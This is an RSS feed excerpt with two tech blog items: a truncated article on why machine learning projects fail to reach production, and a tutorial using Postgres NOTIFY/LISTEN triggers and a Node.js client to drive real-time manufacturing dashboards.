<p>In October 2020, <a href="https://www.gartner.com/en/newsroom/press-releases/2020-10-19-gartner-identifies-the-top-strategic-technology-trends-for-2021#:~:text=Gartner%20research%20shows%20only%2053,a%20production%2Dgrade%20AI%20pipeline." target="_blank" rel="noopener">Gartner reported</a> that only 53% of projects make it from prototype to production—and that’s at organizations with some level of AI experience. For companies still working to develop a data-driven culture, that number is likely far higher, with <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/" target="_blank" rel="noopener">some failure-rate estimates</a> soaring to nearly 90%.&nbsp;</p>



<p>Data-first tech companies like Google, Facebook, and Amazon are transforming our daily lives with ML, while many other well-funded and highly talented teams are still struggling to get their initiatives off the ground. But why does this happen? And how can we fix it?</p>



<p><strong>We share the four biggest challenges modern data teams face when adopting ML at scale— and how to overcome them.&nbsp;</strong></p>



<h3>Misalignment between actual business needs and ML objectives</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>When your business objectives and ML goals are misaligned, all of your best laid plans are bound to fail, just like that model you trained with stale data. Image courtesy of <a href="https://unsplash.com/photos/pjAH2Ax4uWk" target="_blank" rel="noopener">Charles Deluvio</a> on <a href="https://unsplash.com/s/photos/machine-learning" target="_blank" rel="noopener">Unsplash</a>.</figcaption></figure></div>



<p>The first challenge is strategic, not technical: starting with a solution instead of a clearly defined problem.&nbsp;</p>



<p>As companies race to incorporate ML into their organizations, leaders may hire data scientists and ML practitioners to automate or improve processes without a mature understanding of <a href="https://developers.google.com/machine-learning/problem-framing/good" target="_blank" rel="noopener"><strong>which problems are actually suitable for ML</strong></a> to solve. And even when the business problem is a good fit for ML, without a shared definition of what success looks like, projects can languish in experimentation mode for months while stakeholders wait for an idealized level of machine-like perfection that can never be reached.&nbsp;</p>



<p>Machine learning is not magic, it will not solve every problem perfectly, and should, by nature, continue to evolve over time. Sometimes, a model merely achieving the same results as humans is a worthy project—errors and all.&nbsp;</p>



<p>Before starting any project, ask your team or your stakeholders: <em>What business problem are we trying to solve? Why do we believe that ML is the right path? What is the measurable threshold of business value this project is trying to reach? What does “good enough” look like?&nbsp;</em></p>



<p>Without these clear, shared definitions articulated at the outset, many worthy ML projects will never reach production and valuable resources will be wasted. Solve a business problem using ML and not just embark on a ML project for checking off the ML box.</p>



<h3>Model training that doesn’t generalize</h3>



<p>With a clearly defined business problem and targeted success metrics, your potential pitfalls get more technical. During the model training stage, issues related to your training data or model fit are the likeliest culprit for future failure.&nbsp;</p>



<p>The goal of <a href="https://elitedatascience.com/model-training" target="_blank" rel="noopener"><strong>model training</strong></a> is to develop a model that can generalize, or make accurate predictions when given new data because it understands the relationships between data points and can identify trends. Your training dataset should be clean, sizable, and representative of the real-time data your model is expected to process once in production. No where has one seen clean data in a production environment. Expect to spend considerable time cleaning, labeling&nbsp; and feature engineering just to get the data ready.</p>



<p>Representative training data is also key: If your training data doesn’t reflect the actual datasets your model will encounter, you may end up with a model that won’t perform once you’ve reached testing or production.&nbsp;</p>



<p>Another issue that can occur during training is overfitting and underfitting. Overfitting happens when a model learns <em>too much </em>and produces outputs that fit too closely with your training data.</p>



<p>Underfitting is simply the opposite—your model doesn’t learn enough to make useful predictions on even the training data itself, let alone new data it will encounter in testing or production.</p>



<h3>Testing and validation issues</h3>



<p>As you test and validate your models, new challenges can arise from merging multiple data streams and making updates to improve performance. Changes to data sources, model parameters, and <a href="https://en.wikipedia.org/wiki/Feature_engineering" target="_blank" rel="noopener"><strong>feature engineering</strong></a> all introduce room for error.&nbsp;</p>



<p>This may also be the stage when you detect overfitting or underfitting in your model—a model that performed wonderfully during training but fails to produce useful results during testing may be overfit.&nbsp;</p>



<p>Even at companies like Google, where ML engineers abound, <a href="https://www.technologyreview.com/2020/04/27/1000658/google-medical-ai-accurate-lab-real-life-clinic-covid-diabetes-retina-disease/" target="_blank" rel="noopener">surprises</a> in your product models can—and will—arise.&nbsp;</p>



<h3>Deployment and serving hurdles</h3>



<p>Deploying ML projects is rarely simple, and teams typically can’t use consistent workflows to do so—since ML projects solve a wide range of business problems, there’s a similarly wide range of ways to host and deploy them. For example, some projects require batched predictions on a regular basis, while others need to generate and deliver predictions on-demand when an application makes an API request to predict using the model. (This is part of why it’s challenging to make models apply to different use cases, no matter how appealing it may sound to executives who may view ML models as more magic than narrowly focused functions.)</p>



<p>Additionally, some ML projects can require a lot of resources, and cross-functional teams need to agree upon priorities of deployment. Engineers only have so many things they can productionalize, and as we’ve discussed, ML projects are much more than models and algorithms: most will need infrastructure, alerting, maintenance, and more to be successfully deployed.&nbsp;</p>



<p>This is why it’s so important to articulate the business problem clearly at the outset, agree upon what success looks like, design an end-to-end solution, and have a shared understanding of your ML project’s value compared to other priorities. Without this strategic plan, your project may never receive the engineering resources it needs to finally reach production.&nbsp;</p>



<p>For just one example, Netflix never productionalized its <a href="https://www.wired.com/2012/04/netflix-prize-costs/" target="_blank" rel="noopener">million-dollar prize-winning recommendation algorithm</a> due to the winning model’s complexity to implement—instead choosing another submission that was simpler to integrate.&nbsp;&nbsp;</p>



<h3>Tactics for scalable ML in production</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg" alt="" width="768" height="515" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-300x201.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-768x515.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1536x1030.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-2048x1373.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Machine learning isn’t magic, but it is powerful—and often misunderstood.&nbsp; Sort of like this paper stick figure. Image courtesy of <a href="https://unsplash.com/photos/67L18R4tW_w" target="_blank" rel="noopener">Kobu Agency</a> on <a href="http://www.unsplash.com/" target="_blank" rel="noopener">Unsplash.</a></figcaption></figure></div>



<p>Beyond strategic planning and staffing, there are concrete steps you can take to help scale your ML production.&nbsp;</p>



<h4>Lean into the cloud</h4>



<p>If your teams are working locally instead of in the cloud, it’s time to shift. Working in the cloud is the “glue” that keeps model training and deployment workflows in lockstep. Most vendors and open-source tools are developed for the cloud, and once there, it’s much easier to automate processes. Testing, training, validation and model deployment needs to be a repeatable process, it should not go from local Python code to a production environment.</p>



<h4>Leverage a DevOps approach</h4>



<p>Just as we’ve talked about applying DevOps practices to data, like <a href="https://www.montecarlodata.com/how-to-make-your-data-pipelines-more-reliable-with-slas/"><strong>setting data SLAs</strong></a> and measuring data health along <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/">observability pillars</a>, ML teams can follow in DevOps’ footsteps by implementing the <strong><a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html" target="_blank" rel="noopener">Continuous Integration (CI) and Continuous Delivery (CD)</a> model</strong>, while introducing <a href="https://cloud.google.com/solutions/machine-learning/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning" target="_blank" rel="noopener">Continuous Training (CT)</a>. By setting up agile build cycles and tools, ML teams can more rapidly deliver changes into the codebase and improve overall performance.&nbsp;</p>



<p>Similar to DevOps best practices, ML teams should use containerization to consistently run software across any type of device and make it simpler for engineers to productionalize their work. Keeping a consistent and visible build process that deploys smaller changes more frequently allows the team to work more smoothly and have more insight into what’s working well, and what’s not. Visibility also helps would-be code “gatekeepers” trust the build process and speed up the ML team’s workflow.&nbsp;</p>



<p>Investing time to build a strategic MLOps team and processes will help by reducing the likelihood of a project stalling out before production, and making continuous improvements feasible—setting every project up for long-term success.</p>



<h4>Invest in observability and monitoring&nbsp;</h4>



<p>Finally, the primary rule of machine learning is that your outcomes will only be as good as your inputs. Healthy data is absolutely essential to ML. Without clean data and working pipelines, models won’t be able to perform to their fullest potential and may fail to make accurate predictions.&nbsp;</p>



<p>And when you’re relying on ML to make important business decisions, you don’t want to find out about a broken pipeline or inaccurate data after those outputs have already been delivered.&nbsp;</p>



<p>That’s why <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/"><strong>data observability</strong></a>, which provides a full understanding and comprehensive monitoring of data health—and can prevent bad data from reaching your ML models in the first place—is well worth the investment.&nbsp;</p>



<h3>Achieving ML production at scale</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>You don’t need to design the next motion-activated security camera to make an …</figcaption></figure></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/">https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/</a></em></p>]]>
            </description>
            <link>https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26350953</guid>
            <pubDate>Fri, 05 Mar 2021 00:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres Notify for Real Time Dashboards]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26350862">thread link</a>) | @epberry
<br/>
March 4, 2021 | https://blog.arctype.com/postgres-notify-for-real-time-dashboards/ | <a href="https://web.archive.org/web/*/https://blog.arctype.com/postgres-notify-for-real-time-dashboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>We’re going to take a look how I used a Postgres feature, <code>pg_notify</code>, to power a work schedule for a manufacturing company. This particular product went through a dozen or so stages of manufacture, and each time a product advanced to its next stage the worker would record that progress from their workstation. The app we will build in this post displayed this schedule and allowed everyone to see the day’s progress.</p><h3 id="the-observer-pattern-in-sql">The Observer Pattern in SQL</h3><p>If you’re only used to using the standards of SQL in Postgres, the <code>NOTIFY</code> and <code>LISTEN</code> commands might not be familiar. But with these two commands you can implement something akin to the Observer pattern, but in your SQL engine!</p><p>The Observer pattern allows one class of object to “listen” for incoming events and another class to send events to those listeners. This pattern is commonly used for instances where data is being updated or changed, and several possibly unrelated objects need to react to those changes.</p><h3 id="observer-examples">Observer Examples</h3><p>Listening to state changes from a Redux store from inside of a React component is a common example of this pattern. Many React components listen to a single part of the Redux store. Android’s LiveData is another great example of this pattern, where observers can be created to watch for changes and immediately update the state and UI of an app.</p><h3 id="observing-in-postgresql">Observing in PostgreSQL</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1000w, https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>System architecture with pg_notify as the event bus.</figcaption></figure><p><code>NOTIFY</code> and <code>LISTEN</code> work together to allow you to implement this design within your Postgres database. Generally, <code>NOTIFY</code> will be called inside of a SQL query, oftentimes within a trigger. <a href="https://blog.arctype.com/learn-sql-triggers/">Triggers and event-based models go together well.</a> </p><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><p><code>LISTEN</code> is called from your Postgres client. When an event is triggered by <code>NOTIFY</code> the client will be notified. The event contains a payload so the client can tell what event was triggered (this can also contain metadata or actual data from the database). How your client receives this notification and how you are able to process it from there varies from client to client. In our example, the client will use WebSockets to update each connected schedule client after it receives the signal from <code>pg_notify</code>.</p><h2 id="building-the-work-schedule-app">Building the Work Schedule App</h2><h3 id="schema-design">Schema Design</h3><p>Let’s begin on the Postgres side. We are modeling items that are being manufactured. Items in production will be represented by the <code>production_item</code> table. Each <code>production_item</code> has an associated <code>product_id</code> &nbsp;and a current stage of production. </p><figure><img src="https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Frame-27--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Frame-27--1-.png 1000w, https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png 1498w" sizes="(min-width: 720px) 720px"><figcaption>ERD Diagram made with <a href="https://blog.arctype.com/erd-builder/">Arctype's Free Figma template</a>.</figcaption></figure><p>We could store the current production stage as a column in the <code>production_item</code> table, but that would only allow us to see what stage the item is in currently. Instead, we’ll use a <code>production_item_wip</code> (work-in-progress) table where each row will contain a timestamp as the item progresses through the stages of production. Let’s also create a table that stores all the possible stages of production, <code>production_stage</code>. <code>production_stage</code> will have an <code>idx</code> integer column to store the order in which the stages occur. The query below creates the <code>production_item_wip</code> table, as an example.</p><pre><code>create table production_item_wip (  
  id serial primary key,  
  insert_time timestamp default NOW(),  
  production_item_id int references production_item(id),  
  production_stage_id int references production_stage(id),  
  employee_id int references employee(id)  
); </code></pre><p>PROTIP: You may notice I’ve included <code>insert_time</code> on every table. We will not need to use this column on every table for this particular example right now, but I’ve found that it often proves useful in the future. I spend a significant amount of time building queries and extracting useful statistics, and countless times I’ve been unable to use data because it lacked an <code>insert_time</code>. I would err on the side of adding it when designing database schema in general, if you’re unsure whether or not you should.</p><h3 id="postgres-notify-syntax">Postgres NOTIFY Syntax</h3><p>Using NOTIFY to send an event is dead simple! Here is a trigger procedure that sends a notification to the order_progress_event channel.</p><pre><code>create
or replace function fn_production_stage_modified() returns trigger as $psql$
begin
  perform pg_notify(
    'order_progress_event',
    'Time to refresh those screens!'
  );return new;
end;$psql$ language plpgsql;</code></pre><p><code>pg_notify</code> lends itself well to being used within a trigger when used to deliver real-time data streaming. However, you could just as easily call <code>pg_notify</code> from a regular SQL query: <code>select pg_notify('order_progress_event', 'Hello world!');</code></p><p>Inside of a PL/pgSQL procedure, you cannot <code>SELECT</code> a function, like <code>pg_notify</code>, that returns void. Doing so will cause a Postgres error. That’s why in the first example we use <code>perform</code>, while in the second we can simply use <code>select</code>.</p><p>With that procedure created, let’s add the actual trigger so that whenever an item moves along in the production process, and thus another row is inserted for <code>production_item_wip</code>, the procedure above is called.</p><pre><code>create trigger production_stage before
insert
  on production_item_wip for each row execute procedure fn_production_stage_modified();</code></pre><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html--><p>That’s it! In this example the payload is the same each time. You could send actual data rather than just an alert, but in this example I prefer to send a basic notification so the client application can receive it and then in turn, select <em>exactly</em> what it needs in a separate query.</p><p>Encoding data within a notification, whether it’s a push notification or one from something like <code>pg_notify</code>, requires you to abstract away the source of the notification, assuming the data is normally delivered via an HTTP API. Using notifications as a “hint” for your software to reach out and get fresh data from an HTTP API simplifies the process and helps you reduce the number of different data sources you need to maintain.</p><h3 id="postgres-listen-syntax">Postgres LISTEN Syntax</h3><p>Listening to a channel is even simpler: <code>LISTEN order_progress_event;</code> </p><p>That really is all.</p><p>When this event is called, we’ll want to select the latest production data for the day. Here’s a view that will show how many products have progressed through each production stage today:</p><pre><code>create view view_daily_production_stats as
select
  count(1) as stage_count,
  ps.name as stage_namefrom production_item_wip piw
  join production_stage ps on ps.id = piw.production_stage_idwhere date(piw.insert_time) = date(now())
group by
  ps.id</code></pre><p>Now that your client is listening, how can you react to events it receives? This varies by client, since the featuresets of programming languages that serve async events vary heavily. We are using JavaScript’s <code>pg</code> client in this example. JavaScript is commonly used for asynchronous web programming.</p><pre><code>var clients = [];
function eventCallback(event) {
  query('select * from view_daily_production_stats', (data) =&gt; {
    clients.map(c =&gt; {
      c.send(data);
    });
  });
}
client.connect(function(err, client) {
  var query = client.query("LISTEN order_progress_event");
  client.on("notification", eventCallback);
});
;  </code></pre><p>Whenever a new event is received by the PostgreSQL client, the function <code>eventCallback</code> will be called with the payload from <code>NOTIFY</code>. The callback then queries the view we wrote earlier to select the most recent production stage data, and loops through to send the new data to all of the listening clients (Raspberry Pis). The clients receive the data and render HTML.</p><h3 id="putting-it-all-together">Putting it all Together</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/IMG_0744.JPG 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/IMG_0744.JPG 1000w, https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG 1600w" sizes="(min-width: 720px) 720px"></figure><p><code>pg_notify</code> is simple, built-in to PostgreSQL feature that has tons of different potential use cases. If you need a simple, real-time notification of just a few specific events, consider checking it out! <a href="https://blog.arctype.com/p/a2b910df-311c-4f7f-b902-7953de122f4b/www.arctype.com/">Arctype</a>, with its functions for running Javascript alongside SQL, is built for developers who want to build applications like this.</p><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html-->
          </div></div>]]>
            </description>
            <link>https://blog.arctype.com/postgres-notify-for-real-time-dashboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26350862</guid>
            <pubDate>Fri, 05 Mar 2021 00:50:06 GMT</pubDate>
        </item>
    </channel>
</rss>
